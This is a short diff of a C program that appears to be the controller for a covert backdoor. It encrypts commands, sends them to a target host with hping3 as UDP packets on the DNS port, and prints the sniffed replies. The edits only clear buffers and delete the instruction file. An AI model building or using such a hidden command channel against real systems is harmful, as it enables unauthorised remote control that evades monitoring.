@@ -71,11 +71,12 @@ int main(int argc, char *argv[]) {
 
         sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts.sniff_ip);
         system(hping3);
+        remove("instruction.txt");
 
+        memset(buffer, 0, sizeof(buffer));
         recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0,
                  (struct sockaddr *)&target_addr, &target_addr_len);
         printf("%s", buffer);
-        memset(buffer, 0, sizeof(buffer));
     }
 
 
@@ -143,6 +144,7 @@ void get_instruction(struct options_sniffer *opts) {
             memset(input, 0, sizeof(input));
             break;
         }
+        memset(input, 0, sizeof(input));
     }
 }
 
@@ -194,7 +196,7 @@ void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
     // write to file
     fprintf(output, "%s", opts->encrypt_command);
     fclose(output);
-    sleep(1);
+    memset(opts->encrypt_command, 0, sizeof(opts->encrypt_command));
 }
 
 
